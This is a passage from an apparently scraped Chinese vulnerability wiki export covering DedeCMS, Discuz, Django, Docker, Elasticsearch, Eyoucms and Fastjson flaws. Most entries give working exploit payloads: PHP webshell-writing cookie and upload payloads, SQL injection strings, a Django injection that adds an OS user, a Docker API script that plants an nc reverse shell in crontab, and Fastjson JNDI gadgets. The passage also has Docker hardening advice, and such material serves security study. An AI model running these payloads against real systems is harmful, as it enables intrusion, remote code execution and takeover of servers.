ShowMsg(\"成功更新枚举缓存，准备更新调用缓存...\", \"sys_cache_up.php?dopost=ok&step=3&uparc=$uparc\"); exit(); } 跟进WriteEnumsCache() function WriteEnumsCache($egroup='') { global $dsql; $egroups = array(); if($egroup=='') { $dsql->SetQuery(\"SELECT egroup FROM `#@__sys_enum` GROUP BY egroup \"); } else { $dsql->SetQuery(\"SELECT egroup FROM `#@__sys_enum` WHERE egroup='$egroup' GROUP BY egroup \"); } $dsql->Execute('enum'); while($nrow = $dsql->GetArray('enum')) { $egroups[] = $nrow['egroup']; } foreach($egroups as $egroup) { $cachefile = DEDEDATA.'/enums/'.$egroup.'.php'; $fp = fopen($cachefile,'w'); fwrite($fp,'SetQuery(\"SELECT ename,evalue,issign FROM `#@__sys_enum` WHERE egroup='$egroup' ORDER BY disorder ASC, evalue ASC \"); $dsql->Execute('enum'); $issign = -1; $tenum = false; //三级联动标识 while($nrow = $dsql->GetArray('enum')) { fwrite($fp,\"\\$em_{$egroup}s['{$nrow['evalue']}'] = '{$nrow['ename']}';\\r\\n\"); if($issign==-1) $issign = $nrow['issign']; if($nrow['issign']==2) $tenum = true; } if ($tenum) $dsql->ExecuteNoneQuery(\"UPDATE `#@__stepselect` SET `issign`=2 WHERE egroup='$egroup'; \"); fwrite($fp,'?'.'>'); fclose($fp); if(empty($issign)) WriteEnumsJs($egroup); } return '成功更新所有枚举缓存！'; } 可以看到，直接从数据库中读取并写入php文件中，从数据库中取出后并没有经过过滤。 将shell写进数据库中 http://0-sec.org/dede/stepselect_main.php?action=addenum_save&ename=123&egroup=;phpinfo();//&islogin=1 复现 因为包含是在同一个文件，所以直接输入 http://0-sec.org/dede/sys_verifies.php?action=getfiles&refiles[]=123&refiles[]=\\%22;phpinfo();die();// 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 21:06:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/CVE-2019-8362.html":{"url":"0day/Dedecms/CVE-2019-8362.html","title":"（CVE-2019-8362）dedecms v5.7 sp2 后台文件上传 getshell","keywords":"","body":"（CVE-2019-8362）dedecms v5.7 sp2 后台文件上传 getshell 一、漏洞简介 上传zip文件解压缩对于文件名过滤不周，导致getshell 二、漏洞影响 三、复现过程 代码分析 /dede/album_add.php 175行验证后缀 $fm->GetMatchFiles($tmpzipdir,\"jpg|png|gif\",$imgs); 进入函数： function GetMatchFiles($indir, $fileexp, &$filearr) { $dh = dir($indir); while($filename = $dh->read()) { $truefile = $indir.'/'.$filename; if($filename == \".\" || $filename == \"..\") { continue; } else if(is_dir($truefile)) { $this->GetMatchFiles($truefile, $fileexp, $filearr); } else if(preg_match(\"/\\.(\".$fileexp.\")/i\",$filename)) { $filearr[] = $truefile; } } $dh->close(); } 可以确定preg_match(\"/.(\".$fileexp.\")/i\",$filename)只是判断了文件名中是否存在.jpg、.png、.gif中的一个，只要构造1.jpg.php就可以绕过。 复现 1、首先构造一个文件名为1.jpg.php的文件，内容为 2、将该文件进行压缩 3、在常用操作-文件式管理器处上传压缩文件到soft目录下 4、访问dede/album_add.php，选择从 从ZIP压缩包中解压图片 5、发布预览 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 20:15:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Discuz/1.html":{"url":"0day/Discuz/1.html","title":"Discuz！ML 3.x代码执行漏洞","keywords":"","body":"discuz！ML 3.x代码执行漏洞 一、漏洞简介 漏洞类型：代码执行漏洞漏洞原因：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。 二、影响范围 Discuz!ML V3.2-3.4 三、复现过程 cookie字段中会出现xxxx_xxxx_language字段，根本原因就是这个字段存在注入，导致的RCE抓包找到cookie的language的值修改为 xxxx_xxxx_language=sc'.phpinfo().' getshell %27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27 实际为： '.+file_put_contents('shell.php',urldecode('')).' 即可在路径下生成shell.php，连接密码为1 https://github.com/ianxtianxt/discuz-ml-rce 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 10:48:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Discuz/2.html":{"url":"0day/Discuz/2.html","title":"Discuz! X系列全版本后台Sql注入漏洞","keywords":"","body":"Discuz! X系列全版本后台Sql注入漏洞 一、漏洞简介 二、漏洞影响 Discuz! X系列全版本 截止到 Discuz! X3.4 R20191201 UTF-8 三、复现过程 挖过discuz 漏洞的都知道 它会对大部分传参进来的值进行过滤和校验 ，所以当时找了一个二次注入的点 uc_server\\model\\base.php 37行 base(); } function base() { $this->init_var(); $this->init_db(); $this->init_cache(); $this->init_app(); $this->init_user(); $this->init_template(); $this->init_note(); //跟进 $this->init_mail(); } uc_server\\model\\base.php 198行 开始 function init_note() { if($this->note_exists()) { //跟进 $this->load('note'); $_ENV['note']->send(); } } function note_exists() { $noteexists = $this->db->result_first(\"SELECT value FROM \".UC_DBTABLEPRE.\"vars WHERE name='noteexists\".UC_APPID.\"'\"); //从配置文件取值UC_APPID return FALSE; } else { return TRUE; } } 查找UC_APPID source\\admincp\\admincp_setting.php 2523行 $settingnew = $_GET['settingnew']; //传入 if($operation == 'credits') { $extcredits_exists = 0; foreach($settingnew['extcredits'] as $val) { if(isset($val['available']) && $val['available'] == 1) { $extcredits_exists = 1; break; } } if(!$extcredits_exists) { cpmsg('setting_extcredits_must_available'); } if($settingnew['report_reward']) { $settingnew['report_reward']['min'] = intval($settingnew['report_reward']['min']); $settingnew['report_reward']['max'] = intval($settingnew['report_reward']['max']); if($settingnew['report_reward']['min'] > $settingnew['report_reward']['max']) { unset($settingnew['report_reward']); } if($settingnew['report_reward']['min'] == $settingnew['report_reward']['max']) { $settingnew['report_reward'] = array('min' => '', 'max' => ''); } $settingnew['report_reward'] = serialize($settingnew['report_reward']); } $settingnew['creditspolicy'] = @dunserialize($setting['creditspolicy']); $settingnew['creditspolicy']['lowerlimit'] = array(); foreach($settingnew['lowerlimit'] as $key => $value) { if($settingnew['extcredits'][$key]['available']) { $settingnew['creditspolicy']['lowerlimit'][$key] = (float)$value; } } unset($settingnew['lowerlimit']); } if($operation == 'uc' && is_writeable('./config/config_ucenter.php') && $isfounder) { require_once './config/config_ucenter.php'; $ucdbpassnew = $settingnew['uc']['dbpass'] == '********' ? addslashes(UC_DBPW) : addslashes($settingnew['uc']['dbpass']); $settingnew['uc']['key'] = addslashes($settingnew['uc']['key'] == '********' ? addslashes(UC_KEY) : $settingnew['uc']['key']); if(function_exists(\"mysql_connect\") && ini_get(\"mysql.allow_local_infile\")==\"1\" && constant(\"UC_DBHOST\") != $settingnew['uc']['dbhost']){ cpmsg('uc_config_load_data_local_infile_error', '', 'error'); } if($settingnew['uc']['connect']) { $uc_dblink = function_exists(\"mysql_connect\") ? @mysql_connect($settingnew['uc']['dbhost'], $settingnew['uc']['dbuser'], $ucdbpassnew, 1) : new mysqli($settingnew['uc']['dbhost'], $settingnew['uc']['dbuser'], $ucdbpassnew); if(!$uc_dblink) { cpmsg('uc_database_connect_error', '', 'error'); } else { if(function_exists(\"mysql_connect\")) { mysql_close($uc_dblink); } else { $uc_dblink->close(); } } } $fp = fopen('./config/config_ucenter.php', 'r'); $configfile = fread($fp, filesize('./config/config_ucenter.php')); $configfile = trim($configfile); $configfile = substr($configfile, -2) == '?>' ? substr($configfile, 0, -2) : $configfile; fclose($fp); $connect = ''; $settingnew['uc'] = daddslashes($settingnew['uc']); if($settingnew['uc']['connect']) { $connect = 'mysql'; $samelink = ($dbhost == $settingnew['uc']['dbhost'] && $dbuser == $settingnew['uc']['dbuser'] && $dbpw == $ucdbpassnew); $samecharset = !($dbcharset == 'gbk' && UC_DBCHARSET == 'latin1' || $dbcharset == 'latin1' && UC_DBCHARSET == 'gbk'); $configfile = str_replace(\"define('UC_DBHOST', '\".addslashes(UC_DBHOST).\"')\", \"define('UC_DBHOST', '\".$settingnew['uc']['dbhost'].\"')\", $configfile); $configfile = str_replace(\"define('UC_DBUSER', '\".addslashes(UC_DBUSER).\"')\", \"define('UC_DBUSER', '\".$settingnew['uc']['dbuser'].\"')\", $configfile); $configfile = str_replace(\"define('UC_DBPW', '\".addslashes(UC_DBPW).\"')\", \"define('UC_DBPW', '\".$ucdbpassnew.\"')\", $configfile); if(!preg_match('/^[\\w\\d\\_]+$/', $settingnew['uc']['dbtablepre']) || !preg_match('/^[\\w\\d\\_]+$/', $settingnew['uc']['dbname'])) { cpmsg('uc_config_write_error', '', 'error'); } $configfile = str_replace(\"define('UC_DBNAME', '\".addslashes(UC_DBNAME).\"')\", \"define('UC_DBNAME', '\".$settingnew['uc']['dbname'].\"')\", $configfile); $configfile = str_replace(\"define('UC_DBTABLEPRE', '\".addslashes(UC_DBTABLEPRE).\"')\", \"define('UC_DBTABLEPRE', '`\".$settingnew['uc']['dbname'].'`.'.$settingnew['uc']['dbtablepre'].\"')\", $configfile); } $configfile = str_replace(\"define('UC_CONNECT', '\".addslashes(UC_CONNECT).\"')\", \"define('UC_CONNECT', '\".$connect.\"')\", $configfile); $configfile = str_replace(\"define('UC_KEY', '\".addslashes(UC_KEY).\"')\", \"define('UC_KEY', '\".$settingnew['uc']['key'].\"')\", $configfile); $configfile = str_replace(\"define('UC_API', '\".addslashes(UC_API).\"')\", \"define('UC_API', '\".$settingnew['uc']['api'].\"')\", $configfile); $configfile = str_replace(\"define('UC_IP', '\".addslashes(UC_IP).\"')\", \"define('UC_IP', '\".$settingnew['uc']['ip'].\"')\", $configfile); $configfile = str_replace(\"define('UC_APPID', '\".addslashes(UC_APPID).\"')\", \"define('UC_APPID', '\".$settingnew['uc']['appid'].\"')\", $configfile); $fp = fopen('./config/config_ucenter.php', 'w'); if(!($fp = @fopen('./config/config_ucenter.php', 'w'))) { cpmsg('uc_config_write_error', '', 'error'); } @fwrite($fp, trim($configfile)); // 写入到config_ucenter.php 可控UC_APPID 的值 通过上面代码可以看出来只简单的addslashes了一下 @fclose($fp); } isset($settingnew['regname']) && empty($settingnew['regname']) && $settingnew['regname'] = 'register'; isset($settingnew['reglinkname']) && empty($settingnew['reglinkname']) && $settingnew['reglinkname'] = cplang('reglinkname_default'); $nohtmlarray = array('bbname', 'regname', 'reglinkname', 'icp', 'sitemessage', 'site_qq'); foreach($nohtmlarray as $k) { if(isset($settingnew[$k])) { $settingnew[$k] = dhtmlspecialchars($settingnew[$k]); } } if(isset($settingnew['statcode'])) { $settingnew['statcode'] = preg_replace('/language\\s*=[\\s|\\'|\\\"]*php/is', '_', $settingnew['statcode']); $settingnew['statcode'] = str_replace(array(''), array(''), $settingnew['statcode']); } 转义一次的字符串被写人文件中，在PHP解析时就是没有转义过的原始内容 造成了二次注入的产生 漏洞验证 直接构造语句 1' into outfile 'c:\\\\wamp64\\\\tmp\\\\1.txt' -- a 构造报错注入 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-10 20:55:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Django/1.html":{"url":"0day/Django/1.html","title":"（CVE-2019-14234）Django JSONField SQL注入","keywords":"","body":"（CVE-2019-14234）Django JSONField SQL注入 一、漏洞简介 该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。 Django通常搭配postgresql数据库，而JSONField是该数据库的一种数据类型。该漏洞的出现的原因在于Django中JSONField类的实现，Django的model最本质的作用是生成SQL语句，而在Django通过JSONField生成sql语句时，是通过简单的字符串拼接。 通过JSONField类获得KeyTransform类并生成sql语句的位置。 其中key_name是可控的字符串，最终生成的语句是WHERE (field->'[key_name]') = 'value'，因此可以进行SQL注入。 二、漏洞影响 1.11.x before 1.11.23 2.1.x before 2.1.11 2.2.x before 2.2.4 三、复现过程 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/django/CVE-2019-14234/ docker-compose up -d 漏洞利用 1、登录后台 http://ip:8000/admin/vuln/collection/ 2、构造URL进行查询 http://ip:8000/admin/vuln/collection/?detail__a%27b=123 可以看到已经注入成功，并且可以看到构造的SQL语句 为进一步验证注入语句，我们继续构造 http://ip:8000/admin/vuln/collection/?detail__title')='1' or 1=1-- 后台生成的sql语句的关键部分是 WHERE (\"vuln_collection\".\"detail\" -> 'title')='1' or 1=1-- ') = %s 由于or 1=1永为真，因此应该返回所有结果，页面返回结果符合预期，如下图 下一步结合CVE-2019-9193我们尝试进行命令注入，构造url如下 http://ip:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcreate table cmd_exec(cmd_output text)--%20 页面结果虽然报错，但是报错原因是no results to fetch，说明我们的语句已经执行 最终payload http://ip:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'net user admin admin /add'--%20 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-23 20:58:41 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Docker/1.html":{"url":"0day/Docker/1.html","title":"Docker未授权访问","keywords":"","body":"Docker未授权访问 一、漏洞简介 1. 基础介绍 http://www.loner.fm/drops/##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8 docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。 漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。 然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。 2. 测试环境配置 先关闭docker，然后开启： sudo service docker stop # 绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。 sudo docker daemon -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock 参考API规范进行渗透：https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/ 操作Docker API可以使用python dockert api 完成。 pip install docker-py API使用参考：https://docker-py.readthedocs.io/en/stable/api/##client-api 二、影响范围 三、复现过程 3.1 From:phith0n 利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。 import docker client = docker.DockerClient(base_url='http://your-ip:2375/') data = client.containers.run('alpine:latest', r'''sh -c \"echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root\" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}) 写入crontab文件，成功反弹shell： 3.2 python脚本 https://github.com/Tycx2ry/docker_api_vul 安装类库pip install -r requirements.txt 查看运行的容器python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 查看所有的容器python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a 查看所有镜像python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l 查看端口映射python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L 写计划任务（centos,redhat等,加-u参数用于ubuntu等）python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口 写sshkey(自行修改脚本的中公钥)python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k 在容器中执行命令python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e \"id\" -I 容器id 删除容器python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id 修改client api版本python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22 查看服务端api版本python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V 3.3 其他的一些exp https://github.com/netxfly/docker-remote-api-exphttps://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.pyhttps://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8 4. 防护策略 1.修改 Docker Remote API 服务默认参数。注意：该操作需要重启 Docker 服务才能生效。 2.修改 Docker 的启动参数： 定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1 或将默认端口 2375 改为自定义端口 为 Remote API 设置认证措施。参照 官方文档 配置 Rem 3.注意：该操作需要重启 Docker 服务才能生效。 修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。 4.注意：该操作需要重启 Docker 服务才能生效。 设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Elasticsearch/1.html":{"url":"0day/Elasticsearch/1.html","title":"Elasticsearch未授权访问","keywords":"","body":"Elasticsearch未授权访问 一、漏洞简介 ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。 二、影响范围 三、复现过程 安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。 http://0-sec.org:9200/_cat/indices 里面的indices包含了_river一般就是安装了river了。 http://0-sec.org:9200/_plugin/head/ web管理界面http://0-sec.org:9200/_cat/indiceshttp://0-sec.org:9200/_river/_search 查看数据库敏感信息http://0-sec.org:9200/_nodes 查看节点数据 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 01:43:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/eyoucms1.0前台getshell.html":{"url":"0day/Eyoucms/eyoucms1.0前台getshell.html","title":"Eyoucms1.0前台getshell","keywords":"","body":"Eyoucms1.0前台getshell 一、漏洞简介 官网：http://www.eyoucms.com/download/ Cms下载地址：http://www.eyoucms.com/eyoucms1.0.zip 二、漏洞影响 三、复现过程 老样子：先讲如何利用 url: http://test.eyoucms1.0.com/index.php/api/Uploadify/preview 构造: post: data:image/php;base64,PD9waHAgcGhwaW5mbygpOw== Shell: http://test.eyoucms1.0.com/preview/ae85d74a721b0b8bd247bc31207a12e2.php 原理分析 漏洞文件： eyoucms1.0\\application\\api\\controller\\Uploadify.php 漏洞函数：preview() 这里我将每行有意义的代码都解释了一下帮助读者进行查看。 而我刚开始时也思考了一下，这会不会是作者故意搞的后门？ 带着这个问题我去问了一下加的php群的一些程序员 他们很惊讶的 表示data:image/ 居然还可以不是图片？ 好吧。到这里我就基本明白为什么这个漏洞会出现了，估计作者以为data:image/ 只能是图片。 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/kbh8mh 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 16:13:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/1.html":{"url":"0day/Eyoucms/1.html","title":"Eyoucms 1.3.9上传漏洞","keywords":"","body":"Eyoucms 1.3.9上传漏洞 一、漏洞简介 EyouCms是基于TP5.0框架为核心开发的免费+开源的企业内容管理系统，专注企业建站用户需求提供海量各行业模板，降低中小企业网站建设、网络营销成本，致力于打造用户舒适的建站体验。易优cms v1.3.7后台插件模块存在代码执 二、漏洞影响 Weapp.php文件中的create()方法接收了请求中的参数，过滤后直接存入php配置文件中，但是由于过滤不严，导致可以直接写入代码进去并执行。 三、复现过程 1、登陆后台 在后台-----》插件应用-----》上传插件这里可以上传zip文件 在Weapp.php文件中的upload()方法中可以上传zip文件，并会自动解压到一个文件夹名是随机md5值的文件夹下 在后台开启插件功能，上传zip文件，zip中有php一句话木马以及一个任意图片(图片内容无所谓，正常图片即可，但是必须得有) 上传后，虽然会返回错误信息，但是实际上后台已经解压了zip文件 访问内容管理模块，任意选择一个产品进行编辑，再图片集处可以上传图片，选择在线管理，可以在左侧看到该文件夹名 直接访问该文件夹下的php一句话木马文件即可 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 16:13:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/2.html":{"url":"0day/Eyoucms/2.html","title":"Eyoucms 1.4.2 sql注入","keywords":"","body":"Eyoucms 1.4.2 sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 介绍漏洞之前先了解下这套CMS，EyouCms是基于TP5.0（5.0.24）框架为核心开发的免费+开源的企业内容管理系统。 Payload: http://0-sec.org/index.php?m=user&c=pay&a=pay_recharge_detail&querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czoyNzoidXNlcnNfaWQgPSA1KSBhbmQgc2xlZXAoNSkjIjt9fQ== 漏洞文件：/EyouCMS-V1.4.2-UTF8-SP2/application/user/controller/Pay.php 漏洞函数：pay_recharge_detail public function pay_recharge_detail() { $querystr = input('param.querystr/s'); $querydata = unserialize(base64_decode($querystr)); if (!empty($querydata['moneyid']) && !empty($querydata['order_number'])) { 这莫非是？？？没错就是反序列化导致的漏洞（这里标题写了sql注入，其实更准确说应该是增删改查漏洞，如果需要再具体一点那就是THINKPHP反序列化增删改查漏洞）。这里只报错来测试下sql注入 经测试，上述的payload无法执行，因为框架源码替换了 public function __call($method, $args) { if (array_key_exists($method, self::$hook)) { array_unshift($args, $this); return call_user_func_array(self::$hook[$method], $args); } else { throw new Exception('method not exists:' . __CLASS__ . '->' . $method); } } 先说一下我们的反序列化利用点，到后面会调用__toString函数。而我们这里就可以跳过构造think\\process\\pipes\\Windows 类。直接去构造继承Model类的子类。 流程如下： toArray()代码在这（一部分） if (!empty($this->append)) { foreach ($this->append as $key => $name) { if (is_array($name)) { // 追加关联对象属性 $relation = $this->getAttr($key); $item[$key] = $relation->append($name)->toArray(); } elseif (strpos($name, '.')) { list($key, $attr) = explode('.', $name); // 追加关联对象属性 $relation = $this->getAttr($key); $item[$key] = $relation->append([$attr])->toArray(); } else { $relation = Loader::parseName($name, 1, false); if (method_exists($this, $relation)) { $modelRelation = $this->$relation(); //我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点 $value = $this->getRelationData($modelRelation); if (method_exists($modelRelation, 'getBindAttr')) { $bindAttr = $modelRelation->getBindAttr(); if ($bindAttr) { foreach ($bindAttr as $key => $attr) { $key = is_numeric($key) ? $attr : $key; if (isset($this->data[$key])) { throw new Exception('bind attr has exists:' . $key); } else { $item[$key] = $value ? $value->getAttr($attr) : null; } } continue; } } $item[$name] = $value; } else { $item[$name] = $this->getAttr($name); } } } } 心细的小伙伴可能发现了 $this->$relation(); 呸是个人都能发现好不嘞。这里可以调用当前类下所有方法。而数据库增删改查操作也是定义在Model类下。可以忽略parseName函数（无影响），但如果你非要看，呸，我就是不给你看。 首先append属性是我们可以控制的。我们只需要构造append让他进入else分支就够了。然后我们就可以执行相应的数据库操作函数。save、delete、update等。 构造利用链： append = [\"vaaa\"=>\"save\"]; $this->data = [\"username\"=>\"asda2122\"]; $this->pk = \"users\"; $this->table = \"ey_users\"; $this->field = ['users_id','username']; $this->isUpdate = true; $this->updateWhere = \"users_id = 5) and (extractvalue(1,concat(0x5c,(select user()))))#\"; } } namespace think\\model; use think\\Model; class Pivot extends Model { } use think\\model\\Pivot; $arr['moneyid'] = 1; $arr['order_number'] = new Pivot; echo base64_encode(serialize($arr)); ?> 生成Payload： http://0-sec.org/index.php?m=user&c=pay&a=pay_recharge_detail&querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czo2NToidXNlcnNfaWQgPSA1KSBhbmQgKGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDVjLChzZWxlY3QgdXNlcigpKSkpKSMiO319 四、参考链接 https://www.t00ls.net/articles-54207.html 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 16:18:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fastjson/1.html":{"url":"0day/Fastjson/1.html","title":"Fastjson <=1.2.47 远程代码执行漏洞","keywords":"","body":"Fastjson 一、漏洞简介 二、漏洞影响 version 三、复现过程 https://github.com/ianxtianxt/Fastjson-1.2.47-rce 1.2.24 {\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}} 未知版本(1.2.24-41之间) {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.41 {\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.42 {\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}; 1.2.43 {\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true]} 1.2.45 {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}} 1.2.47 {\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}} 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 15:28:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fastjson/2.html":{"url":"0day/Fastjson/2.html","title":"Fastjson <=1.2.60 DoS漏洞无损检测+Fastjson与Jackson组建区分","keywords":"","body":"Fastjson 一、漏洞简介 二、漏洞影响 1.2.60以下版本 三、复现过程 针对Fastjson DoS 漏洞的检测，相对较好识别，但其需要发送 DoS 的请求包，就会有一个时间延迟，但是部分使用者或 SRC平台对 DoS 类漏洞持保守态度。 所以这里提出一种无损检测 Fastjson DoS 漏洞的方法。 首先有以下几种情况： 未知目标是否使用 Fastjson ，但站点有原始报错回显 如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样 例如 无回显，盲区分 Fastjson 和 Jackson Java 系 Json 处理基本只有 Fastjson 和 Jackson。 由于 Jackson 相对比较严格, 这里可以很好分辨出 Fastjson 和 